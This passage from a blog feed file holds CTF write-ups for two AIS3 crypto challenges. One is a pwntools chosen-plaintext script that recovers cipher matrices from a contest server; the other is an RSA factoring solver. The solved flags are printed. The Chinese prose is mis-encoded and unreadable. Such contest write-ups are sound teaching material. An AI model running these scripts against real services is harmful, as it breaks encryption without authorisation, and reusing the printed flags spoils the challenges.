<li>câ‚‚ &#x3D; A Ã— eâ‚  å¾—åˆ° A çš„ 1 </li>
<li>ä»¥æ­¤é¡æ¨â€¦</li>
</ul>
<p>æ¢å¾© A å’Œ B å¾Œï¼Œè¨ˆç®— A çš„é€†çŸ©é™£ï¼Œç„¶å¾Œé€†å‘è§£å¯†ç›®æ¨™ FLAG</p>
<h3 id="æ”»æ“Š-2"><a href="#æ”»æ“Š-2" class="headerlink" title="æ”»æ“Š"></a><strong>æ”»æ“Š</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¨­å®šåƒæ•¸</span></span><br><span class="line">HOST = <span class="string">&#x27;chals1.ais3.org&#x27;</span></span><br><span class="line">PORT = <span class="number">18000</span></span><br><span class="line">n = <span class="number">8</span>  <span class="comment"># å€å¡Šå¤§å°å’ŒçŸ©é™£ç¶­åº¦</span></span><br><span class="line">p_mod = <span class="number">251</span>  <span class="comment"># æ¨¡æ•¸</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_block_line</span>(<span class="params">line</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä½¿ç”¨æ­£å‰‡è¡¨é”å¼è§£æåŒ…å«8å€‹æ•¸å­—çš„è¡Œ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(line, <span class="built_in">bytes</span>):</span><br><span class="line">        line = line.decode().strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        line = line.strip()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä½¿ç”¨æ­£å‰‡è¡¨é”å¼æå–æ‰€æœ‰æ•¸å­—</span></span><br><span class="line">    nums = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> np.array([<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> nums])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mod</span>(<span class="params">matrix, mod</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¨ˆç®—çŸ©é™£çš„æ¨¡é€†&quot;&quot;&quot;</span></span><br><span class="line">    A_matrix = Matrix(matrix)</span><br><span class="line">    A_inv = np.array(A_matrix.inv_mod(mod), dtype=<span class="built_in">int</span>)</span><br><span class="line">    <span class="keyword">return</span> A_inv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. å…ˆè®€å–æ‰€æœ‰åˆå§‹è¼¸å‡º</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Reading all initial output...&quot;</span>)</span><br><span class="line">        all_lines = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = r.recvline(timeout=<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                decoded_line = line.decode().strip()</span><br><span class="line">                all_lines.append(decoded_line)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Received: &#x27;<span class="subst">&#123;decoded_line&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å¦‚æœçœ‹åˆ°è¼¸å…¥æç¤ºå°±åœæ­¢</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> decoded_line.lower() <span class="keyword">for</span> keyword <span class="keyword">in</span> [<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;enter&#x27;</span>, <span class="string">&#x27;message&#x27;</span>]):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[DEBUG] EOF reached&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2. å¾æ‰€æœ‰è¡Œä¸­è§£æç›®æ¨™ FLAG</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Parsing target flag from received lines...&quot;</span>)</span><br><span class="line">        C_target_flag = []</span><br><span class="line">        flag_started = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> all_lines:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Processing line: &#x27;<span class="subst">&#123;line&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æª¢æŸ¥æ˜¯å¦é–‹å§‹ flag å€åŸŸ</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;encrypted flag&quot;</span> <span class="keyword">in</span> line.lower():</span><br><span class="line">                flag_started = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¦‚æœé‡åˆ°è¼¸å…¥æç¤ºå°±åœæ­¢è§£æ flag</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> line.lower() <span class="keyword">for</span> keyword <span class="keyword">in</span> [<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;enter&#x27;</span>, <span class="string">&#x27;message&#x27;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¦‚æœåœ¨ flag å€åŸŸï¼Œå˜—è©¦è§£ææ•¸å­—</span></span><br><span class="line">            <span class="keyword">if</span> flag_started <span class="keyword">and</span> line.strip():</span><br><span class="line">                block = parse_block_line(line)</span><br><span class="line">                <span class="keyword">if</span> block <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    C_target_flag.append(block)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Parsed flag block <span class="subst">&#123;<span class="built_in">len</span>(C_target_flag)&#125;</span>: <span class="subst">&#123;<span class="built_in">list</span>(block)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Target flag has <span class="subst">&#123;<span class="built_in">len</span>(C_target_flag)&#125;</span> blocks&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(C_target_flag) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[ERROR] Failed to parse target flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 3. æ§‹é€  payload M_payload</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Constructing payload...&quot;</span>)</span><br><span class="line">        M_payload_blocks = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            e_i = np.zeros(n, dtype=<span class="built_in">int</span>)</span><br><span class="line">            e_i[i] = <span class="number">1</span></span><br><span class="line">            M_payload_blocks.append(e_i)  <span class="comment"># p_&#123;2i&#125; = e_i</span></span><br><span class="line">            M_payload_blocks.append(np.zeros(n, dtype=<span class="built_in">int</span>))  <span class="comment"># p_&#123;2i+1&#125; = 0</span></span><br><span class="line">        </span><br><span class="line">        payload_bytes_list = []</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> M_payload_blocks:</span><br><span class="line">            payload_bytes_list.extend(<span class="built_in">list</span>(block))</span><br><span class="line">        final_payload = <span class="built_in">bytes</span>(payload_bytes_list)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_payload)&#125;</span> bytes&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 4. ç™¼é€ payload</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Sending payload...&quot;</span>)</span><br><span class="line">        r.sendline(final_payload)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 5. æ¥æ”¶ 2n å€‹å¯†æ–‡å€å¡Š (C_response)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Receiving response blocks...&quot;</span>)</span><br><span class="line">        C_response = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(C_response) &lt; <span class="number">2</span> * n:</span><br><span class="line">                line = r.recvline(timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                decoded_line = line.decode().strip()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Response line: &#x27;<span class="subst">&#123;decoded_line&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> decoded_line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                block = parse_block_line(decoded_line)</span><br><span class="line">                <span class="keyword">if</span> block <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    C_response.append(block)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Received response block <span class="subst">&#123;<span class="built_in">len</span>(C_response)&#125;</span>: <span class="subst">&#123;<span class="built_in">list</span>(block)&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[DEBUG] EOF while receiving response&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(C_response) &lt; <span class="number">2</span> * n:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] Expected <span class="subst">&#123;<span class="number">2</span>*n&#125;</span> response blocks, got <span class="subst">&#123;<span class="built_in">len</span>(C_response)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 6. å¾ C_response æå– A å’Œ B</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Recovering matrices A and B...&quot;</span>)</span><br><span class="line">        A_recovered_cols = []</span><br><span class="line">        B_recovered_cols = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            A_recovered_cols.append(C_response[<span class="number">2</span>*i])</span><br><span class="line">            B_recovered_cols.append(C_response[<span class="number">2</span>*i+<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        A_recovered = np.array(A_recovered_cols).T % p_mod</span><br><span class="line">        B_recovered = np.array(B_recovered_cols).T % p_mod</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Recovered matrix A:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(A_recovered)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 7. è¨ˆç®— A çš„æ¨¡é€†</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Calculating inverse of A...&quot;</span>)</span><br><span class="line">        A_inv = inv_mod(A_recovered, p_mod)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Calculated A_inv successfully&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 8. è§£å¯† C_target_flag</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Decrypting <span class="subst">&#123;<span class="built_in">len</span>(C_target_flag)&#125;</span> target flag blocks...&quot;</span>)</span><br><span class="line">        decrypted_blocks_list = []</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è§£å¯†ç¬¬ä¸€å€‹å€å¡Š</span></span><br><span class="line">        block_0 = (A_inv @ C_target_flag[<span class="number">0</span>]) % p_mod</span><br><span class="line">        decrypted_blocks_list.append(block_0)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Decrypted target flag block 0: <span class="subst">&#123;<span class="built_in">list</span>(block_0)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¿´åœˆè§£å¯†å¾ŒçºŒå€å¡Š</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(C_target_flag)):</span><br><span class="line">            temp = (C_target_flag[i] - B_recovered @ decrypted_blocks_list[i-<span class="number">1</span>] + p_mod) % p_mod</span><br><span class="line">            block_i = (A_inv @ temp) % p_mod</span><br><span class="line">            decrypted_blocks_list.append(block_i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Decrypted target flag block <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;<span class="built_in">list</span>(block_i)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 9. çµ„è£ FLAG å­—ä¸²</span></span><br><span class="line">        flag_bytes = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">bytes</span>(<span class="built_in">list</span>(block_array)) <span class="keyword">for</span> block_array <span class="keyword">in</span> decrypted_blocks_list)</span><br><span class="line">        flag_str = flag_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>).rstrip(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Decrypting all target flag blocks.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] FLAG: <span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] Attack failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        r.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»ç¨‹å¼å…¥å£</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<p>åŸ·è¡Œå¾Œ,æˆ‘å€‘å¾—åˆ°:<br><img src="/img/ais3/FLAGGG.webp"><br>FLAG:<br><code>AIS3&#123;b451c_h1ll_c1ph3r_15_2_3z_f0r_u5&#125;</code></p>
<h2 id="Happy-Happy-Factoring"><a href="#Happy-Happy-Factoring" class="headerlink" title="Happy Happy Factoring"></a>Happy Happy Factoring</h2><p>é€™æ˜¯ä¸€å€‹ç¶“å…¸çš„å¤šç®—æ³•çµ„åˆæ”»æ“Š:</p>
<ul>
<li>wiï¼šWilliamsâ€™ p+1 ç®—æ³•</li>
<li>poï¼šPollardâ€™s p-1 ç®—æ³•</li>
<li>fp, fqï¼šFermat å› å¼åˆ†è§£æ³•</li>
</ul>
<p>å…ˆç”¨ Pollardâ€™s p-1 æ‰¾åˆ° po,ç§»é™¤ poÂ² å¾Œç”¨ Williamsâ€™ p+1 æ‰¾åˆ° wi,æœ€å¾Œç”¨ Fermat æ–¹æ³•åˆ†è§£å‰©é¤˜éƒ¨åˆ†</p>
<p>ç²å¾—æ‰€æœ‰å› æ•¸å¾Œè¨ˆç®—æ­æ‹‰å‡½æ•¸ä¸¦è§£å¯†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_input</span>(<span class="params">filename=<span class="string">&quot;output.txt&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.read().strip().splitlines()</span><br><span class="line">        n = <span class="built_in">int</span>(lines[<span class="number">0</span>].split(<span class="string">&quot; = &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">        e = <span class="built_in">int</span>(lines[<span class="number">1</span>].split(<span class="string">&quot; = &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">        c = <span class="built_in">int</span>(lines[<span class="number">2</span>].split(<span class="string">&quot; = &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> n, e, c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_prime_list</span>():</span><br><span class="line">    <span class="keyword">return</span> [p <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">5000</span>) <span class="keyword">if</span> gmpy2.is_prime(p)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard_p_minus_1</span>(<span class="params">n, prime_list</span>):</span><br><span class="line">    a = gmpy2.mpz(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">86</span>):</span><br><span class="line">        a = gmpy2.powmod(a, <span class="number">2</span>, n)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> prime_list:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">85</span>):</span><br><span class="line">            a = gmpy2.powmod(a, p, n)</span><br><span class="line">    <span class="keyword">return</span> gmpy2.gcd(a - <span class="number">1</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_factor</span>(<span class="params">gcd_val, n, expected_power=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> gcd_val <span class="keyword">in</span> [<span class="number">1</span>, n]: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.is_prime(gcd_val): <span class="keyword">return</span> <span class="built_in">int</span>(gcd_val)</span><br><span class="line">    temp = gcd_val</span><br><span class="line">    factors = []</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> [<span class="number">2</span>] + generate_prime_list():</span><br><span class="line">        <span class="keyword">while</span> temp % p == <span class="number">0</span>:</span><br><span class="line">            factors.append(p)</span><br><span class="line">            temp //= p</span><br><span class="line">        <span class="keyword">if</span> temp == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> temp &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.is_prime(temp): factors.append(<span class="built_in">int</span>(temp))</span><br><span class="line">    counts = Counter(factors)</span><br><span class="line">    <span class="keyword">for</span> f, count <span class="keyword">in</span> counts.items():</span><br><span class="line">        <span class="keyword">if</span> count &gt;= expected_power <span class="keyword">and</span> gmpy2.is_prime(f):</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lucas_V</span>(<span class="params">k, P, N</span>):</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">1</span>: <span class="keyword">return</span> P</span><br><span class="line">    V0, V1 = <span class="number">2</span>, P</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(k)[<span class="number">3</span>:]:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">            V1 = (V0 * V1 - P) % N</span><br><span class="line">            V0 = (V0 * V0 - <span class="number">2</span>) % N</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            V0 = (V0 * V1 - P) % N</span><br><span class="line">            V1 = (V1 * V1 - <span class="number">2</span>) % N</span><br><span class="line">    <span class="keyword">return</span> V1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">williams_p_plus_1</span>(<span class="params">n, prime_list, P=<span class="number">3</span></span>):</span><br><span class="line">    V = P</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">86</span>):</span><br><span class="line">        V = lucas_V(<span class="number">2</span>, V, n)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> prime_list:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">85</span>):</span><br><span class="line">            V = lucas_V(p, V, n)</span><br><span class="line">    <span class="keyword">return</span> gmpy2.gcd(V - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n, max_iter=<span class="number">200_000_000</span></span>):</span><br><span class="line">    a = gmpy2.isqrt(n) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_iter):</span><br><span class="line">        b2 = a * a - n</span><br><span class="line">        b = gmpy2.isqrt(b2)</span><br><span class="line">        <span class="keyword">if</span> b * b == b2:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a + b), <span class="built_in">int</span>(a - b)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">1_000_000</span> == <span class="number">0</span> <span class="keyword">and</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [Fermat] å˜—è©¦ <span class="subst">&#123;i:,&#125;</span> æ¬¡...&quot;</span>)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">n, e, c, po, wi, fp, fq</span>):</span><br><span class="line">    phi = po * (po - <span class="number">1</span>) * (wi - <span class="number">1</span>) * (fp - <span class="number">1</span>) * (fq - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    m = gmpy2.powmod(c, d, n)</span><br><span class="line">    flag = <span class="built_in">int</span>(m).to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">return</span> phi, d, m, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] è®€å– RSA å…¬é–‹åƒæ•¸&quot;</span>)</span><br><span class="line">    n, e, c = read_input()</span><br><span class="line">    primes = generate_prime_list()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Step 1: Pollard p-1&quot;</span>)</span><br><span class="line">    g = pollard_p_minus_1(n, primes)</span><br><span class="line">    po = extract_factor(g, n, expected_power=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> po: <span class="keyword">raise</span> Exception(<span class="string">&quot;æ‰¾ä¸åˆ° po&quot;</span>)</span><br><span class="line">    n1 = n // (po * po)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Step 2: Williams p+1 or fallback&quot;</span>)</span><br><span class="line">    wi = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> base <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>]:</span><br><span class="line">        g = williams_p_plus_1(n1, primes, base)</span><br><span class="line">        candidate = extract_factor(g, n1)</span><br><span class="line">        <span class="keyword">if</span> candidate <span class="keyword">and</span> gmpy2.is_prime(candidate):</span><br><span class="line">            wi = candidate</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> wi:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Williams p+1 å¤±æ•—ï¼Œæ”¹ç”¨ Fermat&quot;</span>)</span><br><span class="line">        f1, f2 = fermat(n1)</span><br><span class="line">        <span class="keyword">if</span> f1 <span class="keyword">and</span> gmpy2.is_prime(f1):</span><br><span class="line">            wi, n2 = f1, f2</span><br><span class="line">        <span class="keyword">elif</span> f2 <span class="keyword">and</span> gmpy2.is_prime(f2):</span><br><span class="line">            wi, n2 = f2, f1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;æ‰¾ä¸åˆ° wi&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n2 = n1 // wi</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Step 3: Fermat åˆ†è§£ fp, fq&quot;</span>)</span><br><span class="line">    fp, fq = fermat(n2)</span><br><span class="line">    <span class="keyword">if</span> fp &lt; fq:</span><br><span class="line">        fp, fq = fq, fp</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Step 4: RSA è§£å¯†&quot;</span>)</span><br><span class="line">    phi, d, m, flag = rsa_decrypt(n, e, c, po, wi, fp, fq)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nğŸ‰ è§£å¯†æˆåŠŸï¼ä»¥ä¸‹æ˜¯è©³ç´°è³‡è¨Šï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nå·²æ‰¾åˆ°å› å­ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;po = <span class="subst">&#123;po&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;wi = <span class="subst">&#123;wi&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;fp = <span class="subst">&#123;fp&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;fq = <span class="subst">&#123;fq&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;phi_n = <span class="subst">&#123;phi&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;m = <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nğŸš© Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/img/ais3/%E7%B5%90%E6%9E%9C.webp"><br>æˆ‘å€‘å°±å¾—åˆ°äº†FLAG:<br><code>AIS3&#123;H@ppY_#ap9y_CRypT0_F4(7or1n&amp;~~~&#125;</code></p>
<h1 id="çµå°¾"><a href="#çµå°¾" class="headerlink" title="çµå°¾"></a>çµå°¾</h1><p>å¾ˆé«˜èˆˆ,ä½ çœ‹åˆ°é€™è£¡çœ¼ç›é‚„æ²’çæ‰<br>ä½†ä¸‹é¢æ²’æ±è¥¿äº†,æ‰€ä»¥æˆ‘å€‘ä¸‹æ¬¡è¦‹(?)</p>
]]></content>
      <categories>
        <category>æŠ€è¡“åˆ†äº«</category>
      </categories>
      <tags>
        <tag>è³‡å®‰</tag>
        <tag>AIS3</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸€æ¬¡æ¶ç¶²ç«™çš„å¿ƒå¾—</title>
    <url>/2025/04/04/firstblog/</url>
    <content><![CDATA[<blockquote>
<h2 id="æ­¤ç‚ºéš”å£é–‹ç™¼å¿ƒå¾—"><a href="#æ­¤ç‚ºéš”å£é–‹ç™¼å¿ƒå¾—" class="headerlink" title="æ­¤ç‚ºéš”å£é–‹ç™¼å¿ƒå¾—"></a>æ­¤ç‚ºéš”å£é–‹ç™¼å¿ƒå¾—</h2><p>éš”å£ç¶²å€: <a href="https://blog.itousouta15.tw/">https://blog.itousouta15.tw</a></p>
</blockquote>
